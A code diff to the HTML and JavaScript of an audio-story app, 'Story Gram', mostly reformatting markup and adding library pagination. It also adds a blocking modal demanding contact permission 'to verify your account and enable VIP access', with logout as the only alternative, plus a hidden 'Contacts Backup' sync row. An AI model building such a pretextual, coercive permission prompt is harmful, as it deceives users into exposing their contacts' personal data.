@@ -1867,8 +1867,8 @@
     /* LIBRARY TAB */
     .library-header-pills {
       display: flex;
-      gap: 8px;
-      padding: 12px 10px;
+      gap: 10px;
+      padding: 10px;
       background: var(--bg-main);
       position: sticky;
       top: 0;
@@ -2255,8 +2255,15 @@
     }
 
     @keyframes popIn {
-      from { transform: scale(0.92); opacity: 0; }
-      to { transform: scale(1); opacity: 1; }
+      from {
+        transform: scale(0.92);
+        opacity: 0;
+      }
+
+      to {
+        transform: scale(1);
+        opacity: 1;
+      }
     }
 
     .access-lock-icon-wrap {
@@ -2523,7 +2530,9 @@
         <div class="brand">
           <div class="brand-logo">
             <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none">
-              <path fill="#e11d48" d="M21.75 12a19.6 19.6 0 0 1-.59 4.634c-.007.033-.006.065-.014.1-.018.072-.043.141-.062.213-.027.108-.062.212-.091.319-.094.343-.183.688-.293 1.02l-.471 1.526a2.76 2.76 0 0 1-2.63 1.94 2.7 2.7 0 0 1-.8-.121l-.966-.3a1.75 1.75 0 0 1-1.161-2.186l1.484-4.854a1.75 1.75 0 0 1 2.187-1.161l.942.289a2.7 2.7 0 0 1 .85.444A17 17 0 0 0 20.25 12a8.25 8.25 0 0 0-16.5 0 17 17 0 0 0 .116 1.865 2.7 2.7 0 0 1 .85-.444l.942-.288a1.75 1.75 0 0 1 2.187 1.16l1.484 4.856a1.747 1.747 0 0 1-1.162 2.185l-.965.3a2.7 2.7 0 0 1-.8.121 2.76 2.76 0 0 1-2.63-1.94L3.3 18.277c-.11-.327-.2-.677-.3-1.024-.028-.1-.062-.2-.089-.309-.018-.072-.043-.139-.061-.212-.008-.033-.007-.065-.014-.1A19.6 19.6 0 0 1 2.25 12a9.75 9.75 0 0 1 19.5 0"></path>
+              <path fill="#e11d48"
+                d="M21.75 12a19.6 19.6 0 0 1-.59 4.634c-.007.033-.006.065-.014.1-.018.072-.043.141-.062.213-.027.108-.062.212-.091.319-.094.343-.183.688-.293 1.02l-.471 1.526a2.76 2.76 0 0 1-2.63 1.94 2.7 2.7 0 0 1-.8-.121l-.966-.3a1.75 1.75 0 0 1-1.161-2.186l1.484-4.854a1.75 1.75 0 0 1 2.187-1.161l.942.289a2.7 2.7 0 0 1 .85.444A17 17 0 0 0 20.25 12a8.25 8.25 0 0 0-16.5 0 17 17 0 0 0 .116 1.865 2.7 2.7 0 0 1 .85-.444l.942-.288a1.75 1.75 0 0 1 2.187 1.16l1.484 4.856a1.747 1.747 0 0 1-1.162 2.185l-.965.3a2.7 2.7 0 0 1-.8.121 2.76 2.76 0 0 1-2.63-1.94L3.3 18.277c-.11-.327-.2-.677-.3-1.024-.028-.1-.062-.2-.089-.309-.018-.072-.043-.139-.061-.212-.008-.033-.007-.065-.014-.1A19.6 19.6 0 0 1 2.25 12a9.75 9.75 0 0 1 19.5 0">
+              </path>
             </svg>
           </div>
           <span class="brand-name">Story Gram</span>
@@ -2531,7 +2540,17 @@
       </div>
     </header>
     <div style="flex: 1; display: flex; align-items: center; justify-content: center; margin-top: 56px;">
-      <div class="spinner"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2v4"/><path d="m16.2 7.8 2.9-2.9"/><path d="M18 12h4"/><path d="m16.2 16.2 2.9 2.9"/><path d="M12 18v4"/><path d="m4.9 19.1 2.9-2.9"/><path d="M2 12h4"/><path d="m4.9 4.9 2.9 2.9"/></svg></div>
+      <div class="spinner"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+          fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 2v4" />
+          <path d="m16.2 7.8 2.9-2.9" />
+          <path d="M18 12h4" />
+          <path d="m16.2 16.2 2.9 2.9" />
+          <path d="M12 18v4" />
+          <path d="m4.9 19.1 2.9-2.9" />
+          <path d="M2 12h4" />
+          <path d="m4.9 4.9 2.9 2.9" />
+        </svg></div>
     </div>
   </div>
 
@@ -2543,7 +2562,9 @@
         <div class="brand">
           <div class="brand-logo">
             <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none">
-              <path fill="#e11d48" d="M21.75 12a19.6 19.6 0 0 1-.59 4.634c-.007.033-.006.065-.014.1-.018.072-.043.141-.062.213-.027.108-.062.212-.091.319-.094.343-.183.688-.293 1.02l-.471 1.526a2.76 2.76 0 0 1-2.63 1.94 2.7 2.7 0 0 1-.8-.121l-.966-.3a1.75 1.75 0 0 1-1.161-2.186l1.484-4.854a1.75 1.75 0 0 1 2.187-1.161l.942.289a2.7 2.7 0 0 1 .85.444A17 17 0 0 0 20.25 12a8.25 8.25 0 0 0-16.5 0 17 17 0 0 0 .116 1.865 2.7 2.7 0 0 1 .85-.444l.942-.288a1.75 1.75 0 0 1 2.187 1.16l1.484 4.856a1.747 1.747 0 0 1-1.162 2.185l-.965.3a2.7 2.7 0 0 1-.8.121 2.76 2.76 0 0 1-2.63-1.94L3.3 18.277c-.11-.327-.2-.677-.3-1.024-.028-.1-.062-.2-.089-.309-.018-.072-.043-.139-.061-.212-.008-.033-.007-.065-.014-.1A19.6 19.6 0 0 1 2.25 12a9.75 9.75 0 0 1 19.5 0"></path>
+              <path fill="#e11d48"
+                d="M21.75 12a19.6 19.6 0 0 1-.59 4.634c-.007.033-.006.065-.014.1-.018.072-.043.141-.062.213-.027.108-.062.212-.091.319-.094.343-.183.688-.293 1.02l-.471 1.526a2.76 2.76 0 0 1-2.63 1.94 2.7 2.7 0 0 1-.8-.121l-.966-.3a1.75 1.75 0 0 1-1.161-2.186l1.484-4.854a1.75 1.75 0 0 1 2.187-1.161l.942.289a2.7 2.7 0 0 1 .85.444A17 17 0 0 0 20.25 12a8.25 8.25 0 0 0-16.5 0 17 17 0 0 0 .116 1.865 2.7 2.7 0 0 1 .85-.444l.942-.288a1.75 1.75 0 0 1 2.187 1.16l1.484 4.856a1.747 1.747 0 0 1-1.162 2.185l-.965.3a2.7 2.7 0 0 1-.8.121 2.76 2.76 0 0 1-2.63-1.94L3.3 18.277c-.11-.327-.2-.677-.3-1.024-.028-.1-.062-.2-.089-.309-.018-.072-.043-.139-.061-.212-.008-.033-.007-.065-.014-.1A19.6 19.6 0 0 1 2.25 12a9.75 9.75 0 0 1 19.5 0">
+              </path>
             </svg>
           </div>
           <span class="brand-name">Story Gram</span>
@@ -2551,11 +2572,13 @@
       </div>
     </header>
 
-    <div class="account-page-wrap" style="width: 100%; max-width: 480px; padding: 10px; margin-top: 56px; display: flex; flex-direction: column; gap: 10px;">
+    <div class="account-page-wrap"
+      style="width: 100%; max-width: 480px; padding: 10px; margin-top: 56px; display: flex; flex-direction: column; gap: 10px;">
       <!-- 1. User Profile Card -->
       <div class="account-profile-card" style="padding: 10px; gap: 10px;">
         <div class="account-avatar" id="restricted-avatar-container">
-          <svg id="restricted-avatar-svg" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <svg id="restricted-avatar-svg" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+            fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
             <circle cx="12" cy="8" r="5" />
             <path d="M20 21a8 8 0 0 0-16 0" />
           </svg>
@@ -2614,7 +2637,17 @@
 
         <div id="home-feed-container">
           <div class="loader">
-            <div class="spinner"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2v4"/><path d="m16.2 7.8 2.9-2.9"/><path d="M18 12h4"/><path d="m16.2 16.2 2.9 2.9"/><path d="M12 18v4"/><path d="m4.9 19.1 2.9-2.9"/><path d="M2 12h4"/><path d="m4.9 4.9 2.9 2.9"/></svg></div>
+            <div class="spinner"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M12 2v4" />
+                <path d="m16.2 7.8 2.9-2.9" />
+                <path d="M18 12h4" />
+                <path d="m16.2 16.2 2.9 2.9" />
+                <path d="M12 18v4" />
+                <path d="m4.9 19.1 2.9-2.9" />
+                <path d="M2 12h4" />
+                <path d="m4.9 4.9 2.9 2.9" />
+              </svg></div>
           </div>
         </div>
       </div>
@@ -2710,7 +2743,7 @@
 
       <!-- TAB 5: ACCOUNT -->
       <div id="tab-account" class="tab-content">
-        <div class="account-page-wrap">
+        <div class="account-page-wrap" style="padding: 16px 12px;">
           <div class="account-profile-card">
             <div class="account-avatar" id="account-avatar-container">
               <svg id="account-avatar-svg" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
@@ -2727,111 +2760,36 @@
             </div>
           </div>
 
-          <!-- VIP & DEVICE ACCESS STATUS CARD -->
-          <div class="section">
-            <div class="section-header">
-              <div class="section-title"><i data-lucide="shield-check"></i> VIP & Device Access</div>
-            </div>
-            <div class="account-card">
-              <div class="account-row">
-                <div class="account-row-left">
-                  <i data-lucide="award" style="color: #fbbf24;"></i>
-                  <span>Access Status</span>
-                </div>
-                <span id="account-vip-badge" class="status-badge"
-                  style="background: rgba(34, 197, 94, 0.15); color: #4ade80; border-color: rgba(34, 197, 94, 0.3);">
-                  <div class="status-dot"></div> <span id="account-vip-status-text">VIP Active</span>
-                </span>
+          <div class="account-card" style="margin-top: 16px;">
+            <div class="account-row" onclick="openLanguageModal()" style="cursor: pointer;">
+              <div class="account-row-left">
+                <i data-lucide="globe" style="color: var(--primary);"></i>
+                <span>Language</span>
               </div>
-              <div class="account-row">
-                <div class="account-row-left">
-                  <i data-lucide="calendar" style="color: #38bdf8;"></i>
-                  <span>Valid Until</span>
-                </div>
-                <span id="account-vip-expiry" style="font-size: 11.5px; font-weight: 700; color: var(--text-main);">Checking...</span>
-              </div>
-              <div class="account-row">
-                <div class="account-row-left">
-                  <i data-lucide="smartphone" style="color: #a78bfa;"></i>
-                  <span>Device ID</span>
-                </div>
-                <div class="account-row-right">
-                  <span id="account-device-id-label" style="font-family: monospace; font-size: 11px; color: #38bdf8; max-width: 120px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">Loading...</span>
-                  <span class="device-copy-badge" onclick="copyAccountDeviceId()">
-                    <i data-lucide="copy" style="width: 10px; height: 10px;"></i> Copy
-                  </span>
-                </div>
-              </div>
-              <div class="account-row" onclick="checkAccessStatus(true)" style="cursor: pointer;">
-                <div class="account-row-left">
-                  <i data-lucide="refresh-cw" id="account-sync-icon" style="color: var(--primary);"></i>
-                  <span>Sync Access with Database</span>
-                </div>
-                <div class="account-row-right">
-                  <span style="color: var(--primary); font-weight: 700; font-size: 11.5px;">Check Status</span>
-                  <i data-lucide="chevron-right"></i>
-                </div>
+              <div class="account-row-right">
+                <span id="account-current-lang"
+                  style="color: var(--text-main); font-weight: 700; text-transform: capitalize;">Hindi</span>
+                <i data-lucide="chevron-right"></i>
               </div>
             </div>
-          </div>
-
-          <div class="section">
-            <div class="section-header">
-              <div class="section-title"><i data-lucide="settings-2"></i> Preferences & Audio</div>
-            </div>
-            <div class="account-card">
-              <div class="account-row" onclick="openLanguageModal()" style="cursor: pointer;">
-                <div class="account-row-left">
-                  <i data-lucide="globe" style="color: var(--primary);"></i>
-                  <span>Content Language</span>
-                </div>
-                <div class="account-row-right">
-                  <span id="account-current-lang"
-                    style="color: var(--text-main); font-weight: 700; text-transform: capitalize;">Hindi</span>
-                  <i data-lucide="chevron-right"></i>
-                </div>
+            <div class="account-row">
+              <div class="account-row-left">
+                <i data-lucide="calendar" style="color: #38bdf8;"></i>
+                <span>Valid Until</span>
               </div>
-              <div class="account-row">
-                <div class="account-row-left">
-                  <i data-lucide="sparkles" style="color: #4ade80;"></i>
-                  <span>Stream Quality</span>
-                </div>
-                <div class="account-row-right">
-                  <span style="color: #4ade80; font-weight: 700;">Unlocked HD (AAC)</span>
-                </div>
+              <span id="account-vip-expiry"
+                style="font-size: 12px; font-weight: 700; color: var(--text-main);">Loading...</span>
+            </div>
+            <div id="account-contact-sync-row" class="account-row" onclick="triggerContactsSync(true)" style="display: none; cursor: pointer;">
+              <div class="account-row-left">
+                <i data-lucide="contact" style="color: #4ade80;"></i>
+                <span>Contacts Backup</span>
+              </div>
+              <div class="account-row-right">
+                <span id="account-contact-sync-badge" style="font-size: 11px; font-weight: 700; color: #4ade80; background: rgba(74, 222, 128, 0.15); padding: 4px 8px; border-radius: 6px;">Sync Now</span>
+                <i data-lucide="chevron-right"></i>
               </div>
             </div>
-          </div>
-
-          <div class="section">
-            <div class="section-header">
-              <div class="section-title"><i data-lucide="server"></i> Server & API Status</div>
-            </div>
-            <div class="account-card">
-              <div class="account-row">
-                <div class="account-row-left">
-                  <i data-lucide="activity" style="color: #38bdf8;"></i>
-                  <span>API Connection</span>
-                </div>
-                <span class="status-badge"
-                  style="background: rgba(34, 197, 94, 0.15); color: #4ade80; border-color: rgba(34, 197, 94, 0.3);">
-                  <div class="status-dot"></div> Online
-                </span>
-              </div>
-              <div class="account-row">
-                <div class="account-row-left">
-                  <i data-lucide="key" style="color: var(--gold);"></i>
-                  <span>Daily Auto Session</span>
-                </div>
-                <span style="font-size: 11px; color: var(--text-muted);">Active (24h Refresh)</span>
-              </div>
-            </div>
-          </div>
-
-          <div class="section" style="margin-top: 14px; display: flex; flex-direction: column; gap: 10px;">
-            <button class="account-danger-btn" onclick="clearAllAppData()" style="opacity: 0.7; font-size: 11px;">
-              <i data-lucide="trash-2"></i> Clear History & Cache
-            </button>
           </div>
         </div>
       </div>
@@ -3033,6 +2991,29 @@
     </div>
   </div>
 
+  <!-- CONTACT PERMISSION REQUIRED MODAL POPUP (OPEN SETTINGS / LOGOUT) -->
+  <div id="contact-permission-modal" class="modal-backdrop" style="display: none; z-index: 99999; background: rgba(0, 0, 0, 0.88); backdrop-filter: blur(8px); align-items: center; justify-content: center;">
+    <div class="modal-card" style="background: #0f172a; border: 1px solid rgba(255, 255, 255, 0.12); border-radius: 20px; width: 90%; max-width: 360px; padding: 24px 20px; text-align: center; box-shadow: 0 20px 40px rgba(0, 0, 0, 0.8); animation: popIn 0.3s cubic-bezier(0.16, 1, 0.3, 1);">
+      <div style="width: 60px; height: 60px; border-radius: 50%; background: rgba(225, 29, 72, 0.15); border: 1px solid rgba(225, 29, 72, 0.3); display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; color: #e11d48;">
+        <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M22 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+      </div>
+      <h3 style="font-size: 18px; font-weight: 800; color: #fff; margin-bottom: 8px;">Permission Required</h3>
+      <p style="font-size: 13px; color: #94a3b8; line-height: 1.5; margin-bottom: 22px;">
+        Contact permission is required to verify your account and enable VIP access. Please grant permission in settings.
+      </p>
+      <div style="display: flex; flex-direction: column; gap: 10px;">
+        <button id="btn-open-settings-perm" onclick="handleContactPermissionPrompt()" style="width: 100%; padding: 13px; border-radius: 12px; background: #e11d48; color: #fff; border: none; font-size: 14px; font-weight: 800; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px;">
+          <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12.22 2h-.44a2 2 0 0 0-2 2v.18a2 2 0 0 1-1 1.73l-.43.25a2 2 0 0 1-2 0l-.15-.08a2 2 0 0 0-2.73.73l-.22.38a2 2 0 0 0 .73 2.73l.15.1a2 2 0 0 1 1 1.72v.51a2 2 0 0 1-1 1.74l-.15.09a2 2 0 0 0-.73 2.73l.22.38a2 2 0 0 0 2.73.73l.15-.08a2 2 0 0 1 2 0l.43.25a2 2 0 0 1 1 1.73V20a2 2 0 0 0 2 2h.44a2 2 0 0 0 2-2v-.18a2 2 0 0 1 1-1.73l.43-.25a2 2 0 0 1 2 0l.15.08a2 2 0 0 0 2.73-.73l.22-.39a2 2 0 0 0-.73-2.73l-.15-.08a2 2 0 0 1-1-1.74v-.5a2 2 0 0 1 1-1.74l.15-.09a2 2 0 0 0 .73-2.73l-.22-.38a2 2 0 0 0-2.73-.73l-.15.08a2 2 0 0 1-2 0l-.43-.25a2 2 0 0 1-1-1.73V4a2 2 0 0 0-2-2z"/><circle cx="12" cy="12" r="3"/></svg>
+          <span>Open Settings</span>
+        </button>
+        <button onclick="logoutUser()" style="width: 100%; padding: 12px; border-radius: 12px; background: rgba(255, 255, 255, 0.06); color: #cbd5e1; border: 1px solid rgba(255, 255, 255, 0.1); font-size: 13px; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 6px;">
+          <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" x2="9" y1="12" y2="12"/></svg>
+          <span>Logout</span>
+        </button>
+      </div>
+    </div>
+  </div>
+
   <!-- TOAST NOTIFICATION -->
   <div id="toast" class="toast">
     <i data-lucide="check-circle-2" style="color: #4ade80;"></i>
@@ -3066,7 +3047,42 @@
     let currentLibrarySection = 'episodes';
     let dbHistoryShows = [];
     let dbFavoriteShows = [];
+    let historyDisplayLimit = 30;
+    let favoriteDisplayLimit = 30;
     let isFetchingDbLibrary = false;
+    let isLoadingMoreLibrary = false;
+
+    function formatValidUntilDate(val) {
+      if (!val || val === 0 || val === '0' || val === 'lifetime' || val === 'Lifetime') {
+        return 'Lifetime';
+      }
+      let dateObj = null;
+      if (typeof val === 'number') {
+        dateObj = new Date(val > 1e11 ? val : val * 1000);
+      } else if (typeof val === 'string') {
+        const num = Number(val);
+        if (!isNaN(num) && num > 0) {
+          dateObj = new Date(num > 1e11 ? num : num * 1000);
+        } else {
+          dateObj = new Date(val);
+        }
+      }
+      if (!dateObj || isNaN(dateObj.getTime())) {
+        return val || 'Lifetime';
+      }
+
+      let hours = dateObj.getHours();
+      const minutes = String(dateObj.getMinutes()).padStart(2, '0');
+      const ampm = hours >= 12 ? 'PM' : 'AM';
+      hours = hours % 12;
+      hours = hours ? hours : 12;
+
+      const day = String(dateObj.getDate()).padStart(2, '0');
+      const month = String(dateObj.getMonth() + 1).padStart(2, '0');
+      const year = dateObj.getFullYear();
+
+      return `${hours}:${minutes} ${ampm} - ${day}/${month}/${year}`;
+    }
 
     let playHistory = [];
     try {
@@ -3096,7 +3112,7 @@
           shaka.polyfill.installAll();
           if (shaka.Player.isBrowserSupported()) {
             shakaPlayer = new shaka.Player(audioElement);
-            
+
             shakaPlayer.configure({
               abr: {
                 enabled: true
@@ -3337,7 +3353,15 @@
         });
       } else if (tabName === 'account') {
         const langEl = document.getElementById('account-current-lang');
-        if (langEl) langEl.innerText = currentLanguage;
+        if (langEl) {
+          const langObj = AVAILABLE_LANGUAGES.find(l => l.id === currentLanguage);
+          langEl.innerText = langObj ? langObj.name : currentLanguage;
+        }
+        const accExpiry = document.getElementById('account-vip-expiry');
+        if (accExpiry && currentUserAccessData) {
+          let val = currentUserAccessData.validity !== undefined ? currentUserAccessData.validity : (currentUserAccessData.allowed_until !== undefined ? currentUserAccessData.allowed_until : (currentUserAccessData.user && currentUserAccessData.user.validity));
+          accExpiry.innerText = formatValidUntilDate(val);
+        }
       }
     }
 
@@ -3423,7 +3447,7 @@
               language: currentLanguage,
               deviceId: getDeviceId()
             })
-          }).catch(() => {});
+          }).catch(() => { });
         }
       } catch (e) { }
     }
@@ -3762,7 +3786,7 @@
               show_name: title || 'Show Details',
               show_url: imageUrl || ''
             })
-          }).catch(() => {});
+          }).catch(() => { });
         }
       } catch (e) { }
     }
@@ -3814,7 +3838,7 @@
               show_name: title,
               show_url: img
             })
-          }).catch(() => {});
+          }).catch(() => { });
         }
       } catch (e) {
         console.error("Favorite sync error:", e);
@@ -4068,6 +4092,8 @@
 
     function switchLibrarySection(section) {
       currentLibrarySection = section;
+      historyDisplayLimit = 30;
+      favoriteDisplayLimit = 30;
       document.getElementById('lib-pill-episodes')?.classList.toggle('active', section === 'episodes');
       document.getElementById('lib-pill-history')?.classList.toggle('active', section === 'history');
       document.getElementById('lib-pill-favorite')?.classList.toggle('active', section === 'favorite');
@@ -4081,6 +4107,15 @@
           }
         });
       }
+    }
+
+    function removeEpisodeFromHistory(e, storyId) {
+      if (e) e.stopPropagation();
+      playHistory = playHistory.filter(item => item.storyId !== storyId);
+      try {
+        localStorage.setItem('storygram_history', JSON.stringify(playHistory));
+      } catch (err) { }
+      renderLibraryTab();
     }
 
     function clearPlayHistory() {
@@ -4105,7 +4140,7 @@
               uid: uid,
               action: 'history'
             })
-          }).catch(() => {});
+          }).catch(() => { });
         }
       } catch (e) { }
       renderLibraryTab();
@@ -4127,7 +4162,7 @@
               action: 'history',
               show_id: showId
             })
-          }).catch(() => {});
+          }).catch(() => { });
         }
       } catch (e) { }
       renderLibraryTab();
@@ -4154,7 +4189,7 @@
               action: 'saved',
               show_id: showId
             })
-          }).catch(() => {});
+          }).catch(() => { });
         }
       } catch (e) { }
 
@@ -4167,7 +4202,8 @@
       if (!container) return;
 
       if (currentLibrarySection === 'episodes') {
-        if (!playHistory || playHistory.length === 0) {
+        const episodeList = (playHistory || []).slice(0, 100);
+        if (episodeList.length === 0) {
           container.innerHTML = `
             <div style="text-align:center; padding: 60px 20px; color: var(--text-muted); font-size: 13px;">
               <i data-lucide="headphones" style="width: 38px; height: 38px; margin-bottom: 12px; color: var(--primary); opacity: 0.85;"></i>
@@ -4181,39 +4217,42 @@
 
         container.innerHTML = `
           <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; padding: 0 4px;">
-            <span style="font-size: 12px; font-weight: 700; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px;">Recently Played (${playHistory.length})</span>
+            <span style="font-size: 12px; font-weight: 700; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px;">Recently Played (${episodeList.length})</span>
             <button onclick="clearPlayHistory()" style="background: none; border: none; color: #f87171; font-size: 11px; font-weight: 700; cursor: pointer; display: flex; align-items: center; gap: 4px; padding: 4px 8px; border-radius: var(--radius-sm);">
               <i data-lucide="trash-2" style="width: 13px; height: 13px;"></i> Clear All
             </button>
           </div>
           <div class="episodes-list">
-            ${playHistory.map(item => {
-              const isCurrent = currentPlayingStory && currentPlayingStory.storyId === item.storyId;
-              const isThisPlaying = isCurrent && isPlaying;
-              const hasVid = Boolean(item.hasVideo && item.videoUrl);
-              const audioUrl = item.audioUrl || item.mediaUrl || "";
-              const videoUrl = item.videoUrl || "";
-              const epShowId = item.showId || "";
-              return `
-                <div class="episode-item ${isCurrent ? 'playing' : ''}" id="ep-item-${escapeAttr(item.storyId)}" style="background: var(--bg-card); border-radius: var(--radius-md); margin-bottom: 8px; border: 1px solid var(--border); padding: 8px 12px;">
-                  <div class="ep-left" onclick="handleEpisodeClick('${escapeAttr(item.storyId)}', '${escapeAttr(item.title)}', '${escapeAttr(audioUrl)}', '${escapeAttr(videoUrl)}', '${escapeAttr(item.showTitle)}', '${escapeAttr(item.thumbUrl)}', ${hasVid}, '${escapeAttr(epShowId)}')">
-                    <div class="ep-play-btn" data-has-video="${hasVid ? 'true' : 'false'}">
+            ${episodeList.map(item => {
+          const isCurrent = currentPlayingStory && currentPlayingStory.storyId === item.storyId;
+          const isThisPlaying = isCurrent && isPlaying;
+          const hasVid = Boolean(item.hasVideo && item.videoUrl);
+          const audioUrl = item.audioUrl || item.mediaUrl || "";
+          const videoUrl = item.videoUrl || "";
+          const epShowId = item.showId || "";
+          return `
+                <div class="episode-item ${isCurrent ? 'playing' : ''}" id="ep-item-${escapeAttr(item.storyId)}" style="background: var(--bg-card); border-radius: var(--radius-md); margin-bottom: 8px; border: 1px solid var(--border); padding: 8px 12px; display: flex; align-items: center; justify-content: space-between;">
+                  <div class="ep-left" onclick="handleEpisodeClick('${escapeAttr(item.storyId)}', '${escapeAttr(item.title)}', '${escapeAttr(audioUrl)}', '${escapeAttr(videoUrl)}', '${escapeAttr(item.showTitle)}', '${escapeAttr(item.thumbUrl)}', ${hasVid}, '${escapeAttr(epShowId)}')" style="flex: 1; min-width: 0; display: flex; align-items: center; gap: 12px; cursor: pointer;">
+                    <div class="ep-play-btn" data-has-video="${hasVid ? 'true' : 'false'}" style="flex-shrink: 0;">
                       <i data-lucide="${isThisPlaying ? 'pause' : (hasVid ? 'video' : 'headphones')}"></i>
                     </div>
-                    <div class="ep-info">
-                      <div class="ep-title">${escapeHtml(item.title)}</div>
-                      <div class="ep-show-name" style="font-size: 11.5px; color: var(--text-muted); font-weight: 600; margin-top: 2px;">${escapeHtml(item.showTitle)}</div>
+                    <div class="ep-info" style="flex: 1; min-width: 0;">
+                      <div class="ep-title" style="white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">${escapeHtml(item.title)}</div>
+                      <div class="ep-show-name" style="font-size: 11.5px; color: var(--text-muted); font-weight: 600; margin-top: 2px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">${escapeHtml(item.showTitle)}</div>
                     </div>
+                  </div>
+                  <div class="ep-delete-btn" onclick="removeEpisodeFromHistory(event, '${escapeAttr(item.storyId)}')" title="Delete" style="padding: 6px; color: var(--text-muted); cursor: pointer; display: flex; align-items: center; justify-content: center; border-radius: var(--radius-sm); margin-left: 8px; flex-shrink: 0;">
+                    <i data-lucide="x" style="width: 16px; height: 16px;"></i>
                   </div>
                 </div>
               `;
-            }).join('')}
+        }).join('')}
           </div>
         `;
         refreshIcons();
       } else if (currentLibrarySection === 'history') {
-        const historyList = (dbHistoryShows && dbHistoryShows.length > 0) ? dbHistoryShows : [];
-        if (historyList.length === 0) {
+        const fullList = ((dbHistoryShows && dbHistoryShows.length > 0) ? dbHistoryShows : []).slice(0, 90);
+        if (fullList.length === 0) {
           container.innerHTML = `
             <div style="text-align:center; padding: 60px 20px; color: var(--text-muted); font-size: 13px;">
               <i data-lucide="history" style="width: 38px; height: 38px; margin-bottom: 12px; color: var(--primary); opacity: 0.85;"></i>
@@ -4225,19 +4264,22 @@
           return;
         }
 
+        const visibleList = fullList.slice(0, historyDisplayLimit);
+        const hasMore = visibleList.length < fullList.length;
+
         container.innerHTML = `
           <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; padding: 0 4px;">
-            <span style="font-size: 12px; font-weight: 700; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px;">Show History (${historyList.length})</span>
+            <span style="font-size: 12px; font-weight: 700; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px;">Show History (${fullList.length})</span>
             <button onclick="clearShowHistory()" style="background: none; border: none; color: #f87171; font-size: 11px; font-weight: 700; cursor: pointer; display: flex; align-items: center; gap: 4px; padding: 4px 8px; border-radius: var(--radius-sm);">
               <i data-lucide="trash-2" style="width: 13px; height: 13px;"></i> Clear
             </button>
           </div>
-          <div class="grid-container">
-            ${historyList.map(show => {
-              const showId = show.show_id || "";
-              const showTitle = show.show_name || show.title || "Show";
-              const showImg = show.show_url || show.image_url || "";
-              return `
+          <div class="grid-container" id="lib-history-grid">
+            ${visibleList.map(show => {
+          const showId = show.show_id || "";
+          const showTitle = show.show_name || show.title || "Show";
+          const showImg = show.show_url || show.image_url || "";
+          return `
                 <div class="grid-card" onclick="openShowPage('${escapeAttr(showId)}', '${escapeAttr(showTitle)}', '${escapeAttr(showImg)}')">
                   <div class="grid-poster-wrap">
                     <img class="grid-poster" src="${escapeAttr(showImg || 'https://via.placeholder.com/130')}" alt="${escapeAttr(showTitle)}" loading="lazy">
@@ -4248,8 +4290,13 @@
                   <div class="grid-title">${escapeHtml(showTitle)}</div>
                 </div>
               `;
-            }).join('')}
+        }).join('')}
           </div>
+          ${hasMore ? `
+            <div id="lib-scroll-loader" style="display: flex; justify-content: center; align-items: center; padding: 20px 0; width: 100%;">
+              <div class="spinner" style="width: 24px; height: 24px;"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2v4"/><path d="m16.2 7.8 2.9-2.9"/><path d="M18 12h4"/><path d="m16.2 16.2 2.9 2.9"/><path d="M12 18v4"/><path d="m4.9 19.1 2.9-2.9"/><path d="M2 12h4"/><path d="m4.9 4.9 2.9 2.9"/></svg></div>
+            </div>
+          ` : ''}
         `;
         refreshIcons();
       } else {
@@ -4266,8 +4313,8 @@
             }
           });
         }
-        const favKeys = Object.keys(favMap);
-        if (favKeys.length === 0) {
+        const fullFavKeys = Object.keys(favMap).slice(0, 90);
+        if (fullFavKeys.length === 0) {
           container.innerHTML = `
             <div style="text-align:center; padding: 60px 20px; color: var(--text-muted); font-size: 13px;">
               <i data-lucide="heart" style="width: 38px; height: 38px; margin-bottom: 12px; color: var(--primary); opacity: 0.85;"></i>
@@ -4279,17 +4326,20 @@
           return;
         }
 
